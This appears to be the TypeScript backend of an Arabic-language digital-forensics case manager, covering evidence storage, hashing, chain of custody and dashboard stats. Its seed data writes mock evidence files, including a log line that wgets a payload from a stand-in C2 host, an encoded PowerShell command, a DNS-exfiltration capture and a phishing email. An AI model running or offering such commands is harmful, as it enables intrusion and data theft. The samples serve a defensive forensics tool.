import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { v4 as uuidv4 } from 'uuid';
import {
  Case,
  Evidence,
  Relationship,
  ChainOfCustody,
  Tag,
  AuditLog,
  VerificationResult,
  DashboardStats,
  EvidenceType,
  EvidenceStatus,
  CasePriority,
  CaseStatus,
} from '../src/types.js';

const INSTANCE_DIR = path.join(process.cwd(), 'instance');
const STORAGE_DIR = path.join(process.cwd(), 'storage', 'evidence');
const DB_FILE = path.join(INSTANCE_DIR, 'forensics.json');

// Ensure directories exist
if (!fs.existsSync(INSTANCE_DIR)) {
  fs.mkdirSync(INSTANCE_DIR, { recursive: true });
}
if (!fs.existsSync(STORAGE_DIR)) {
  fs.mkdirSync(STORAGE_DIR, { recursive: true });
}

export interface DbSchema {
  cases: Case[];
  evidences: Evidence[];
  relationships: Relationship[];
  chain_of_custody: ChainOfCustody[];
  tags: Tag[];
  audit_logs: AuditLog[];
}

// Initial seed helper file generator
function createSeedFile(filename: string, content: string): string {
  const filePath = path.join(STORAGE_DIR, filename);
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, content, 'utf-8');
  }
  const fileBuffer = fs.readFileSync(filePath);
  return crypto.createHash('sha256').update(fileBuffer).digest('hex');
}

function createSeedFileMD5(filename: string): string {
  const filePath = path.join(STORAGE_DIR, filename);
  const fileBuffer = fs.readFileSync(filePath);
  return crypto.createHash('md5').update(fileBuffer).digest('hex');
}

function getInitialData(): DbSchema {
  // Create sample files
  const logFile = 'auth_server_access_2026.log';
  const mailFile = 'suspicious_phishing_email.eml';
  const dumpFile = 'memory_dump_volatile_0x89.raw';
  const pcapFile = 'network_packet_capture_dns.pcap';
  const dbDumpFile = 'leaked_users_credentials.csv';

  createSeedFile(logFile, `2026-08-01 10:14:22 [AUTH] Failed password for root from 192.168.1.105 port 44322 ssh2
2026-08-01 10:14:25 [AUTH] Accepted password for admin from 192.168.1.105 port 44324 ssh2
2026-08-01 10:15:01 [CMD] Admin executed: wget http://malicious-c2-server.org/payload.sh
2026-08-01 10:15:10 [CRON] Privilege escalation script triggered by UID 0`);

  createSeedFile(mailFile, `From: attacker@shadow-net.io
To: cfo@finance-corp.com
Subject: عاجل: تحديث بيانات الحساب البنكي
Date: Sun, 03 Aug 2026 14:20:00 +0300
Content-Type: text/plain; charset=utf-8

يرجى الضغط على الرابط التالي لتحديث بيانات الاعتماد الخاصة بالحساب المصرفي قبل إلغاء التفعيل:
http://verification-portal.shadow-net.io/login?token=9f8a2c1b`);

  createSeedFile(dumpFile, `VOLATILE_MEMORY_HEADER_0x892A
PROCESS_LIST:
PID 1042: lsass.exe
PID 3402: cmd.exe -> /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...
KEYS_FOUND: AES-256-GCM Key: 4a8b1c9d2e3f405162738495a6b7c8d9`);

  createSeedFile(pcapFile, `PACKET_CAPTURE_V1.2
PACKET 1: 10.0.0.12 -> 185.220.101.5 DNS Query: exfiltrate.data.shadow-net.io
PACKET 2: 185.220.101.5 -> 10.0.0.12 DNS Response TXT "ACK_EXFIL_PART1"
PACKET 3: 10.0.0.12 -> 185.220.101.5 HTTP POST /api/v1/upload (Size: 4096 bytes)`);

  createSeedFile(dbDumpFile, `id,username,email_hash,status
1,ahmed_cfo,e10adc3949ba59abbe56e057f20f883e,active
2,sara_sysadmin,c33367701511b4f6020ec61ded352059,active
3,khalid_finance,5d41402abc4b2a76b9719d911017c592,compromised`);

  const case1Id = uuidv4();
  const case2Id = uuidv4();

  const ev1Id = uuidv4();
  const ev2Id = uuidv4();
  const ev3Id = uuidv4();
  const ev4Id = uuidv4();
  const ev5Id = uuidv4();

  return {
    cases: [
      {
        id: case1Id,
        case_number: 'CASE-2026-089',
        title: 'تحقيق اختراق خادم المعاملات المالية (Server Intrusion)',
        description: 'تحقيق جنائي رقمي في حادثة الوصول غير المصرح به لخادم المالية الرئيسي واستخراج بيانات المستخدمين.',
        status: 'investigating',
        priority: 'critical',
        created_at: new Date(Date.now() - 86400000 * 5).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: case2Id,
        case_number: 'CASE-2026-102',
        title: 'قضية التصيد الاحتيالي والتسلل عبر البريد الإلكتروني',
        description: 'تحليل هجمات Phishing موجهة للإدارة التنفيذية بروابط خبيثة لاختراق الشبكة الداخلية.',
        status: 'open',
        priority: 'high',
        created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
        updated_at: new Date().toISOString(),
      },
    ],
    evidences: [
      {
        id: ev1Id,
        case_id: case1Id,
        title: 'سجل الوصول للخادم (Server Access Log)',
        evidence_type: 'log',
        description: 'سجل خادم Linux الذي يحتوي على محاولات الدخول عبر SSH وتنفيذ أوامر بصلحيات الجذر.',
        filename: logFile,
        file_path: `storage/evidence/${logFile}`,
        file_size: fs.statSync(path.join(STORAGE_DIR, logFile)).size,
        file_hash_md5: createSeedFileMD5(logFile),
        file_hash_sha256: createSeedFile(logFile, ''),
        source: 'خادم SSH الرئيسي (IP: 192.168.1.100)',
        collected_by: 'المحقق طارق الحارثي',
        collected_date: new Date(Date.now() - 86400000 * 4).toISOString(),
        status: 'verified',
        tags: ['سجلات', 'SSH', 'اختراق', 'سري جداً'],
        created_at: new Date(Date.now() - 86400000 * 4).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: ev2Id,
        case_id: case2Id,
        title: 'رسالة بريد إلكتروني احتيالية (Phishing Email)',
        evidence_type: 'email',
        description: 'رسالة إلكترونية تحتوي على رابط خبيث موجه للمدير المالي لتحديث بيانات البنك.',
        filename: mailFile,
        file_path: `storage/evidence/${mailFile}`,
        file_size: fs.statSync(path.join(STORAGE_DIR, mailFile)).size,
        file_hash_md5: createSeedFileMD5(mailFile),
        file_hash_sha256: createSeedFile(mailFile, ''),
        source: 'خادم البريد Exchange - صندوق الوارد CFO',
        collected_by: 'المحققة سارة العتيبي',
        collected_date: new Date(Date.now() - 86400000 * 2).toISOString(),
        status: 'analyzed',
        tags: ['بريد_احتيالي', 'Phishing', 'روابط_خبيثة'],
        created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: ev3Id,
        case_id: case1Id,
        title: 'تفريغ الذاكرة المؤقتة (Volatile Memory Dump)',
        evidence_type: 'memory',
        description: 'صورة كاملة لذاكرة الخادم عند اكتشاف الاختراق تحتوي على مفاتيح التشفير والعمليات النشطة.',
        filename: dumpFile,
        file_path: `storage/evidence/${dumpFile}`,
        file_size: fs.statSync(path.join(STORAGE_DIR, dumpFile)).size,
        file_hash_md5: createSeedFileMD5(dumpFile),
        file_hash_sha256: createSeedFile(dumpFile, ''),
        source: 'جهاز الخادم المصاب - RAM Dump',
        collected_by: 'المحقق طارق الحارثي',
        collected_date: new Date(Date.now() - 86400000 * 3).toISOString(),
        status: 'analyzing',
        tags: ['ذاكرة_RAM', 'مفاتيح_تشفير', 'تحليل_حي'],
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: ev4Id,
        case_id: case1Id,
        title: 'حزم بيانات الشبكة (DNS Packet Capture)',
        evidence_type: 'network',
        description: 'تسجيل حزم البيانات التي أظهرت الاتصال بخادم التحكم والسيطرة C2 الخارجي.',
        filename: pcapFile,
        file_path: `storage/evidence/${pcapFile}`,
        file_size: fs.statSync(path.join(STORAGE_DIR, pcapFile)).size,
        file_hash_md5: createSeedFileMD5(pcapFile),
        file_hash_sha256: createSeedFile(pcapFile, ''),
        source: 'مستشعر الشبكة Wireshark / Network TAP',
        collected_by: 'المحقق محمد الجابر',
        collected_date: new Date(Date.now() - 86400000 * 3).toISOString(),
        status: 'verified',
        tags: ['شبكة', 'DNS_Tunneling', 'C2'],
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: ev5Id,
        case_id: case1Id,
        title: 'قاعدة البيانات المسرّبة (Leaked User Credentials)',
        evidence_type: 'database',
        description: 'ملف البيانات الذي تم استخراج من الخادم ويحتوي على قيم التجزئة لبيانات الدخول.',
        filename: dbDumpFile,
        file_path: `storage/evidence/${dbDumpFile}`,
        file_size: fs.statSync(path.join(STORAGE_DIR, dbDumpFile)).size,
        file_hash_md5: createSeedFileMD5(dbDumpFile),
        file_hash_sha256: createSeedFile(dbDumpFile, ''),
        source: 'موقع التسريبات المغلق / DarkWeb Dump',
        collected_by: 'المحقق طارق الحارثي',
        collected_date: new Date(Date.now() - 86400000 * 1).toISOString(),
        status: 'pending',
        tags: ['قاعدة_بيانات', 'تسريب', 'بيانات_حساسة'],
        created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
        updated_at: new Date().toISOString(),
      },
    ],
    relationships: [
      {
        id: uuidv4(),
        source_id: ev1Id,
        target_id: ev3Id,
        relationship_type: 'contains',
        description: 'سجل الوصول يتطابق زمنياً مع العمليات المفتوحة المكتشفة في ذاكرة RAM.',
        confidence_score: 95,
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
        created_by: 'المحقق طارق الحارثي',
      },
      {
        id: uuidv4(),
        source_id: ev1Id,
        target_id: ev4Id,
        relationship_type: 'originates_from',
        description: 'الأوامر المنفذة في سجل الخادم قامت بفتح الاتصال الهجومي المكتشف في حزم الشبكة.',
        confidence_score: 90,
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
        created_by: 'المحقق محمد الجابر',
      },
      {
        id: uuidv4(),
        source_id: ev4Id,
        target_id: ev5Id,
        relationship_type: 'points_to',
        description: 'بيانات الشبكة تأكد عملية نقل واستخراج ملف تسريب المستخدمين للخارج.',
        confidence_score: 88,
        created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
        created_by: 'المحقق طارق الحارثي',
      },
      {
        id: uuidv4(),
        source_id: ev2Id,
        target_id: ev1Id,
        relationship_type: 'related_to',
        description: 'الرابط المذكور في بريد التخريب يوجه لنفس النطاق الخارجي الموجود في سجل الخادم.',
        confidence_score: 85,
        created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
        created_by: 'المحققة سارة العتيبي',
      },
    ],
    chain_of_custody: [
      {
        id: uuidv4(),
        evidence_id: ev1Id,
        action: 'collected',
        from_user: 'نظام الخادم',
        to_user: 'المحقق طارق الحارثي',
        notes: 'تم سحب سجلات الوصول مباشرة من الخادم عبر اتصال SSH آمن وحفظ البصمة MD5.',
        location: 'معمل أدلة الجرائم الرقمية - الخزنة رقم 4',
        created_at: new Date(Date.now() - 86400000 * 4).toISOString(),
      },
      {
        id: uuidv4(),
        evidence_id: ev1Id,
        action: 'verified',
        from_user: 'المحقق طارق الحارثي',
        to_user: 'المحقق طارق الحارثي',
        notes: 'تمت مطابقة بصمة SHA256 والتأكد من عدم تعديل الملف.',
        location: 'معمل الأدلة الرقمية',
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
      },
      {
        id: uuidv4(),
        evidence_id: ev2Id,
        action: 'collected',
        from_user: 'سيرفر البريد الإلكتروني',
        to_user: 'المحققة سارة العتيبي',
        notes: 'تصدير رسالة البريد بتنسيق EML وحساب التجزئة الرقمية.',
        location: 'وحدة التحقيق في الجرائم الإلكترونية',
        created_at: new Date(Date.now() - 86400000 * 2).toISOString(),
      },
      {
        id: uuidv4(),
        evidence_id: ev3Id,
        action: 'collected',
        from_user: 'الخادم المصاب',
        to_user: 'المحقق طارق الحارثي',
        notes: 'أخذ لقطة ذاكرة Ram Dump باستخدام أداة LiME.',
        location: 'خزنة الأدلة الرقمية المشفرة',
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
      },
    ],
    tags: [
      { id: uuidv4(), name: 'سجلات', color: '#3B82F6' },
      { id: uuidv4(), name: 'اختراق', color: '#EF4444' },
      { id: uuidv4(), name: 'Phishing', color: '#F59E0B' },
      { id: uuidv4(), name: 'سري جداً', color: '#8B5CF6' },
      { id: uuidv4(), name: 'شبكة', color: '#10B981' },
      { id: uuidv4(), name: 'قاعدة_بيانات', color: '#EC4899' },
    ],
    audit_logs: [
      {
        id: uuidv4(),
        action: 'إنشاء قضية',
        user: 'المحقق طارق الحارثي',
        details: 'تم إنشاء قضية جديدة رقم CASE-2026-089',
        created_at: new Date(Date.now() - 86400000 * 5).toISOString(),
      },
      {
        id: uuidv4(),
        action: 'رفع دليل',
        user: 'المحقق طارق الحارثي',
        details: 'تم رفع الدليل "سجل الوصول للخادم" وحساب البصمات بنجاح.',
        created_at: new Date(Date.now() - 86400000 * 4).toISOString(),
      },
      {
        id: uuidv4(),
        action: 'إضافة علاقة',
        user: 'المحقق طارق الحارثي',
        details: 'تم ربط الدليل "سجل الوصول" بالدليل "تفريغ الذاكرة".',
        created_at: new Date(Date.now() - 86400000 * 3).toISOString(),
      },
      {
        id: uuidv4(),
        action: 'التحقق من البصمة',
        user: 'المحقق طارق الحارثي',
        details: 'التحقق من سلامة البصمة الرقمية للدليل auth_server_access_2026.log',
        created_at: new Date(Date.now() - 86400000 * 1).toISOString(),
      },
    ],
  };
}

class ForensicsDatabase {
  private data: DbSchema;

  constructor() {
    this.data = this.loadData();
  }

  private loadData(): DbSchema {
    if (!fs.existsSync(DB_FILE)) {
      const initial = getInitialData();
      this.saveData(initial);
      return initial;
    }
    try {
      const content = fs.readFileSync(DB_FILE, 'utf-8');
      return JSON.parse(content);
    } catch (e) {
      console.error('Error reading forensics DB, recreating seed:', e);
      const initial = getInitialData();
      this.saveData(initial);
      return initial;
    }
  }

  private saveData(newData?: DbSchema): void {
    if (newData) {
      this.data = newData;
    }
    try {
      fs.writeFileSync(DB_FILE, JSON.stringify(this.data, null, 2), 'utf-8');
    } catch (e) {
      console.error('Error writing to forensics DB:', e);
    }
  }

  // Audit Logger
  public logAudit(action: string, user: string, details: string) {
    this.data.audit_logs.unshift({
      id: uuidv4(),
      action,
      user,
      details,
      created_at: new Date().toISOString(),
    });
    this.saveData();
  }

  // CASES
  public getCases(filters?: { status?: string; priority?: string; search?: string }): Case[] {
    let cases = [...this.data.cases];

    // Compute evidence counts
    cases = cases.map((c) => ({
      ...c,
      evidence_count: this.data.evidences.filter((e) => e.case_id === c.id).length,
    }));

    if (filters?.status) {
      cases = cases.filter((c) => c.status === filters.status);
    }
    if (filters?.priority) {
      cases = cases.filter((c) => c.priority === filters.priority);
    }
    if (filters?.search) {
      const term = filters.search.toLowerCase();
      cases = cases.filter(
        (c) =>
          c.case_number.toLowerCase().includes(term) ||
          c.title.toLowerCase().includes(term) ||
          c.description.toLowerCase().includes(term)
      );
    }

    return cases.sort(
      (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
    );
  }

  public getCaseById(id: string): Case | null {
    const c = this.data.cases.find((item) => item.id === id);
    if (!c) return null;
    return {
      ...c,
      evidence_count: this.data.evidences.filter((e) => e.case_id === c.id).length,
    };
  }

  public createCase(data: {
    case_number?: string;
    title: string;
    description: string;
    priority: CasePriority;
    status?: CaseStatus;
  }): Case {
    const newCase: Case = {
      id: uuidv4(),
      case_number:
        data.case_number ||
        `CASE-${new Date().getFullYear()}-${Math.floor(100 + Math.random() * 900)}`,
      title: data.title,
      description: data.description || '',
      status: data.status || 'open',
      priority: data.priority || 'medium',
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };

    this.data.cases.unshift(newCase);
    this.logAudit('إنشاء قضية', 'المحقق النظام', `تم إنشاء القضية ${newCase.case_number}`);
    this.saveData();
    return newCase;
  }

  public updateCase(
    id: string,
    updates: Partial<Pick<Case, 'title' | 'description' | 'status' | 'priority'>>
  ): Case | null {
    const idx = this.data.cases.findIndex((c) => c.id === id);
    if (idx === -1) return null;

    this.data.cases[idx] = {
      ...this.data.cases[idx],
      ...updates,
      updated_at: new Date().toISOString(),
    };

    this.logAudit(
      'تحديث قضية',
      'المحقق النظام',
      `تم تحديث بيانات القضية ${this.data.cases[idx].case_number}`
    );
    this.saveData();
    return this.data.cases[idx];
  }

  public deleteCase(id: string): boolean {
    const c = this.getCaseById(id);
    if (!c) return false;

    // Remove evidence files & evidence records
    const relatedEvidences = this.data.evidences.filter((e) => e.case_id === id);
    for (const ev of relatedEvidences) {
      this.deleteEvidence(ev.id);
    }

    this.data.cases = this.data.cases.filter((item) => item.id !== id);
    this.logAudit('حذف قضية', 'المحقق النظام', `تم حذف القضية ${c.case_number}`);
    this.saveData();
    return true;
  }

  // EVIDENCES
  public getEvidences(filters?: {
    case_id?: string;
    evidence_type?: string;
    status?: string;
    search?: string;
    tag?: string;
  }): Evidence[] {
    let list = [...this.data.evidences];

    if (filters?.case_id) {
      list = list.filter((e) => e.case_id === filters.case_id);
    }
    if (filters?.evidence_type) {
      list = list.filter((e) => e.evidence_type === filters.evidence_type);
    }
    if (filters?.status) {
      list = list.filter((e) => e.status === filters.status);
    }
    if (filters?.tag) {
      list = list.filter((e) => e.tags.includes(filters.tag!));
    }
    if (filters?.search) {
      const term = filters.search.toLowerCase();
      list = list.filter(
        (e) =>
          e.title.toLowerCase().includes(term) ||
          e.description.toLowerCase().includes(term) ||
          e.filename.toLowerCase().includes(term) ||
          e.file_hash_md5.toLowerCase().includes(term) ||
          e.file_hash_sha256.toLowerCase().includes(term) ||
          e.source.toLowerCase().includes(term) ||
          e.collected_by.toLowerCase().includes(term)
      );
    }

    // Attach case info
    return list
      .map((ev) => {
        const parentCase = this.data.cases.find((c) => c.id === ev.case_id);
        return {
          ...ev,
          case_number: parentCase?.case_number || '',
          case_title: parentCase?.title || '',
        };
      })
      .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  }

  public getEvidenceById(id: string): Evidence | null {
    const ev = this.data.evidences.find((item) => item.id === id);
    if (!ev) return null;
    const parentCase = this.data.cases.find((c) => c.id === ev.case_id);
    return {
      ...ev,
      case_number: parentCase?.case_number || '',
      case_title: parentCase?.title || '',
    };
  }

  public addEvidence(
    fileInfo: { filename: string; path: string; size: number; buffer: Buffer },
    metadata: {
      case_id: string;
      title: string;
      evidence_type: EvidenceType;
      description?: string;
      source?: string;
      collected_by?: string;
      tags?: string[];
      status?: EvidenceStatus;
    }
  ): Evidence {
    const md5Hash = crypto.createHash('md5').update(fileInfo.buffer).digest('hex');
    const sha256Hash = crypto.createHash('sha256').update(fileInfo.buffer).digest('hex');

    const evId = uuidv4();
    const newEvidence: Evidence = {
      id: evId,
      case_id: metadata.case_id,
      title: metadata.title,
      evidence_type: metadata.evidence_type || 'file',
      description: metadata.description || '',
      filename: fileInfo.filename,
      file_path: fileInfo.path,
      file_size: fileInfo.size,
      file_hash_md5: md5Hash,
      file_hash_sha256: sha256Hash,
      source: metadata.source || 'مصدر غير محدد',
      collected_by: metadata.collected_by || 'المحقق الجنائي',
      collected_date: new Date().toISOString(),
      status: metadata.status || 'pending',
      tags: metadata.tags || [],
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };

    this.data.evidences.unshift(newEvidence);

    // Auto add initial Chain of Custody record
    this.data.chain_of_custody.unshift({
      id: uuidv4(),
      evidence_id: evId,
      action: 'collected',
      from_user: metadata.source || 'الموقع الجنائي',
      to_user: metadata.collected_by || 'المحقق الجنائي',
      notes: `تم تحريز الدليل الأصلي ورصد البصمات: MD5(${md5Hash}) و SHA256(${sha256Hash})`,
      location: 'خزنة الأدلة الرقمية الرئيسية',
      created_at: new Date().toISOString(),
    });

    this.logAudit(
      'رفع دليل رقمي',
      metadata.collected_by || 'المحقق الجنائي',
      `تم رفع الدليل ${newEvidence.title} لحساب البصمات ${sha256Hash.substring(0, 10)}...`
    );

    this.saveData();
    return this.getEvidenceById(evId)!;
  }

  public updateEvidence(
    id: string,
    updates: Partial<Pick<Evidence, 'title' | 'description' | 'status' | 'source' | 'tags'>>
  ): Evidence | null {
    const idx = this.data.evidences.findIndex((e) => e.id === id);
    if (idx === -1) return null;

    this.data.evidences[idx] = {
      ...this.data.evidences[idx],
      ...updates,
      updated_at: new Date().toISOString(),
    };

    this.logAudit(
      'تعديل دليل',
      'المحقق النظام',
      `تم تحديث بيانات الدليل ${this.data.evidences[idx].title}`
    );

    this.saveData();
    return this.getEvidenceById(id);
  }

  public deleteEvidence(id: string): boolean {
    const ev = this.data.evidences.find((e) => e.id === id);
    if (!ev) return false;

    // Try deleting physical file
    const absPath = path.isAbsolute(ev.file_path)
      ? ev.file_path
      : path.join(process.cwd(), ev.file_path);
    if (fs.existsSync(absPath)) {
      try {
        fs.unlinkSync(absPath);
      } catch (e) {
        console.error('Error deleting file:', absPath, e);
      }
    }

    // Delete relationships & custody logs
    this.data.relationships = this.data.relationships.filter(
      (r) => r.source_id !== id && r.target_id !== id
    );
    this.data.chain_of_custody = this.data.chain_of_custody.filter((c) => c.evidence_id !== id);
    this.data.evidences = this.data.evidences.filter((e) => e.id !== id);

    this.logAudit('حذف دليل', 'المحقق النظام', `تم حذف الدليل ${ev.title}`);
    this.saveData();
    return true;
  }

  // HASH VERIFICATION
  public verifyEvidenceIntegrity(id: string): VerificationResult {
    const ev = this.data.evidences.find((e) => e.id === id);
    if (!ev) {
      return {
        is_valid: false,
        file_exists: false,
        stored_md5: '',
        calculated_md5: '',
        stored_sha256: '',
        calculated_sha256: '',
        verified_at: new Date().toISOString(),
        message: 'الدليل غير موجود في سجلات النظام.',
      };
    }

    const absPath = path.isAbsolute(ev.file_path)
      ? ev.file_path
      : path.join(process.cwd(), ev.file_path);

    if (!fs.existsSync(absPath)) {
      return {
        is_valid: false,
        file_exists: false,
        stored_md5: ev.file_hash_md5,
        calculated_md5: '',
        stored_sha256: ev.file_hash_sha256,
        calculated_sha256: '',
        verified_at: new Date().toISOString(),
        message: 'الملف الأصلي مفقود من وحدة التخزين!',
      };
    }

    try {
      const buffer = fs.readFileSync(absPath);
      const calcMD5 = crypto.createHash('md5').update(buffer).digest('hex');
      const calcSHA256 = crypto.createHash('sha256').update(buffer).digest('hex');

      const isMatch = calcMD5 === ev.file_hash_md5 && calcSHA256 === ev.file_hash_sha256;

      if (isMatch) {
        // Update evidence status to verified if not already
        this.updateEvidence(id, { status: 'verified' });
        // Log in chain of custody
        this.addCustodyLog({
          evidence_id: id,
          action: 'verified',
          from_user: 'نظام التحقق الآلي',
          to_user: 'المحقق المسؤول',
          notes: `تمت إعادة حساب بصمة الملف وإثبات صحتها وتطابقها التام مع البصمة المسجلة.`,
          location: 'وحدة التحقق الرقمية',
        });
      }

      this.logAudit(
        'التحقق من سلامة الدليل',
        'نظام التحقق',
        `نتيجة التحقق من الدليل ${ev.title}: ${isMatch ? 'سليم ومتطابق' : 'تنبيه: غير متطابق!'}`
      );

      return {
        is_valid: isMatch,
        file_exists: true,
        stored_md5: ev.file_hash_md5,
        calculated_md5: calcMD5,
        stored_sha256: ev.file_hash_sha256,
        calculated_sha256: calcSHA256,
        verified_at: new Date().toISOString(),
        message: isMatch
          ? 'تم التحقق بنجاح: بصمات MD5 و SHA256 مطابقة تماماً، لم يتم أي تعديل على الدليل.'
          : 'تحذير أمني: البصمة الحالية لا تطابق البصمة المسجلة! قد يكون تم تعديل الملف.',
      };
    } catch (err: any) {
      return {
        is_valid: false,
        file_exists: true,
        stored_md5: ev.file_hash_md5,
        calculated_md5: '',
        stored_sha256: ev.file_hash_sha256,
        calculated_sha256: '',
        verified_at: new Date().toISOString(),
        message: `حدث خطأ أثناء قراءة الملف: ${err.message}`,
      };
    }
  }

  // RELATIONSHIPS
  public getRelationships(case_id?: string, evidence_id?: string): Relationship[] {
    let rels = [...this.data.relationships];

    if (case_id) {
      const caseEvidences = this.data.evidences
        .filter((e) => e.case_id === case_id)
        .map((e) => e.id);
      rels = rels.filter(
        (r) => caseEvidences.includes(r.source_id) || caseEvidences.includes(r.target_id)
      );
    }

    if (evidence_id) {
      rels = rels.filter((r) => r.source_id === evidence_id || r.target_id === evidence_id);
    }

    return rels.map((r) => {
      const src = this.data.evidences.find((e) => e.id === r.source_id);
      const tgt = this.data.evidences.find((e) => e.id === r.target_id);
      return {
        ...r,
        source_title: src?.title || 'دليل غير معروف',
        target_title: tgt?.title || 'دليل غير معروف',
        source_type: src?.evidence_type,
        target_type: tgt?.evidence_type,
      };
    });
  }

  public createRelationship(data: {
    source_id: string;
    target_id: string;
    relationship_type: any;
    description: string;
    confidence_score: number;
    created_by?: string;
  }): Relationship {
    const newRel: Relationship = {
      id: uuidv4(),
      source_id: data.source_id,
      target_id: data.target_id,
      relationship_type: data.relationship_type,
      description: data.description || '',
      confidence_score: Number(data.confidence_score) || 80,
      created_at: new Date().toISOString(),
      created_by: data.created_by || 'المحقق الجنائي',
    };

    this.data.relationships.unshift(newRel);

    const src = this.data.evidences.find((e) => e.id === data.source_id);
    const tgt = this.data.evidences.find((e) => e.id === data.target_id);

    this.logAudit(
      'إنشاء علاقة بين أدلة',
      data.created_by || 'المحقق الجنائي',
      `ربط العلاقة (${data.relationship_type}) بين [${src?.title || ''}] و [${tgt?.title || ''}]`
    );

    this.saveData();
    return this.getRelationships().find((r) => r.id === newRel.id)!;
  }

  public deleteRelationship(id: string): boolean {
    const idx = this.data.relationships.findIndex((r) => r.id === id);
    if (idx === -1) return false;
    this.data.relationships.splice(idx, 1);
    this.logAudit('حذف علاقة', 'المحقق النظام', `تم حذف العلاقة رقم ${id}`);
    this.saveData();
    return true;
  }

  // CHAIN OF CUSTODY
  public getCustodyLogs(evidence_id: string): ChainOfCustody[] {
    return this.data.chain_of_custody
      .filter((c) => c.evidence_id === evidence_id)
      .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  }

  public addCustodyLog(data: {
    evidence_id: string;
    action: any;
    from_user: string;
    to_user: string;
    notes?: string;
    location?: string;
  }): ChainOfCustody {
    const log: ChainOfCustody = {
      id: uuidv4(),
      evidence_id: data.evidence_id,
      action: data.action,
      from_user: data.from_user,
      to_user: data.to_user,
      notes: data.notes || '',
      location: data.location || 'معمل الأدلة الرقمية',
      created_at: new Date().toISOString(),
    };

    this.data.chain_of_custody.unshift(log);

    const ev = this.data.evidences.find((e) => e.id === data.evidence_id);
    this.logAudit(
      'سلسلة الحفظ',
      data.to_user,
      `تسجيل إجراء ${data.action} للدليل ${ev?.title || ''}`
    );

    this.saveData();
    return log;
  }

  // TAGS & AUDIT LOGS
  public getTags(): Tag[] {
    return this.data.tags;
  }

  public getAuditLogs(): AuditLog[] {
    return this.data.audit_logs;
  }

  // DASHBOARD STATS
  public getDashboardStats(): DashboardStats {
    const totalCases = this.data.cases.length;
    const openCases = this.data.cases.filter((c) => c.status !== 'closed').length;
    const totalEvidence = this.data.evidences.length;
    const verifiedEvidence = this.data.evidences.filter((e) => e.status === 'verified').length;
    const totalRelationships = this.data.relationships.length;

    const evidenceByType: Record<EvidenceType, number> = {
      file: 0,
      image: 0,
      log: 0,
      email: 0,
      url: 0,
      network: 0,
      memory: 0,
      database: 0,
    };
    for (const ev of this.data.evidences) {
      if (evidenceByType[ev.evidence_type] !== undefined) {
        evidenceByType[ev.evidence_type]++;
      }
    }

    const evidenceByStatus: Record<EvidenceStatus, number> = {
      pending: 0,
      analyzing: 0,
      analyzed: 0,
      verified: 0,
    };
    for (const ev of this.data.evidences) {
      if (evidenceByStatus[ev.status] !== undefined) {
        evidenceByStatus[ev.status]++;
      }
    }

    const casesByPriority: Record<CasePriority, number> = {
      low: 0,
      medium: 0,
      high: 0,
      critical: 0,
    };
    for (const c of this.data.cases) {
      if (casesByPriority[c.priority] !== undefined) {
        casesByPriority[c.priority]++;
      }
    }

    const casesByStatus: Record<CaseStatus, number> = {
      open: 0,
      investigating: 0,
      closed: 0,
    };
    for (const c of this.data.cases) {
      if (casesByStatus[c.status] !== undefined) {
        casesByStatus[c.status]++;
      }
    }

    const recentEvidences = this.getEvidences().slice(0, 5);
    const recentCases = this.getCases({ status: 'open' }).slice(0, 5);

    return {
      total_cases: totalCases,
      open_cases: openCases,
      total_evidence: totalEvidence,
      verified_evidence: verifiedEvidence,
      total_relationships: totalRelationships,
      evidence_by_type: evidenceByType,
      evidence_by_status: evidenceByStatus,
      cases_by_priority: casesByPriority,
      cases_by_status: casesByStatus,
      recent_evidences: recentEvidences,
      recent_cases: recentCases,
    };
  }
}

export const db = new ForensicsDatabase();
